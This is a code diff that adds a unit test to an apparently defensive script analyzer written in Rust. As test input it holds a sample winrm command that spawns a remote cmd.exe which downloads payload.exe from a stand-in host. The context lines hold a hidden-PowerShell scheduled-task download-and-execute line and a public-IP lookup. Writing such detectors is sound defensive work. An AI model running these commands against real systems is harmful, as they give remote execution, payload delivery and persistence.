@@ -2629,6 +2629,32 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn winrm_invoke_replays_remote_cmd_child() {
+        let script = br#"winrm invoke Create wmicimv2/Win32_Process -r:target.example @{CommandLine="cmd.exe /V:ON /c set U=https://winrm-wrapper.example/payload.exe&&curl -o payload.exe !U!";CurrentDirectory="C:\Windows"}"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://winrm-wrapper.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "winrm remote child command was not analyzed: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteExec { tool, target_host }
+                    if tool == "winrm" && target_host == "target.example"
+            )),
+            "winrm remote exec trait missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn geoplugin_public_ip_lookup_emits_network_probe() {
         let script = br#"@echo off
 for /f "tokens=1 delims=:" %%A in ('curl -# -k "http://www.geoplugin.net/php.gp?ip"') do set geo=%%A
